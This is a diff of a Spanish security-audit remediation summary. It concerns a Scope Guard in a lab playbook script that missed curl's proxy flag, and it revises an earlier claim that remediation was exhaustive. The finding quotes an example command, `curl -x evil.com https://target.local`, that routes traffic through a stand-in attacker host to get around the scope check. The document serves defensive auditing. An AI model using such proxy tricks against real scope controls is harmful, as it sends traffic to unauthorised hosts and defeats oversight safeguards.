@@ -2,8 +2,8 @@
 
 ## Resumen Ejecutivo
 
-- **ID de Mejora:** Auditoría de Seguridad & Robustecimiento de Salvaguardas — Ronda 7 (Blocker B3 y Major M4).
-- **Objetivo:** Resolver de forma exhaustiva los hallazgos de la séptima auditoría de seguridad sobre el commit `1b9e4fc`:
+- **ID de Mejora:** Auditoría de Seguridad & Robustecimiento de Salvaguardas — Ronda 7 (Blocker B3 y Major M4; continuada y complementada en Fase 251).
+- **Objetivo:** Resolver los hallazgos de la séptima auditoría de seguridad sobre el commit `1b9e4fc` (la calificación de remediación exhaustiva fue prematura y fue completada en la Fase 251 al abordarse sintaxis de proxy compactas/agrupadas y placeholders bajo banderas de destino):
   1. **B3 — Extracción y Verificación de Banderas de Proxy y Sensibilidad a Mayúsculas:**
      - En `scripts/seclab_playbook.py`, banderas como `-x` (proxy en `curl`) se agrupaban erróneamente en `FLAGS_EXPECTING_NON_TARGET_VALUE` y se normalizaban a minúsculas (`tok_clean.lower()`), haciendo que comandos como `curl -x evil.com https://target.local` ignoraran `evil.com`. Scope Guard solo evaluaba `https://target.local` y autorizaba el tráfico, llegando a invocar `subprocess.run()`.
      - **Solución implementada:**
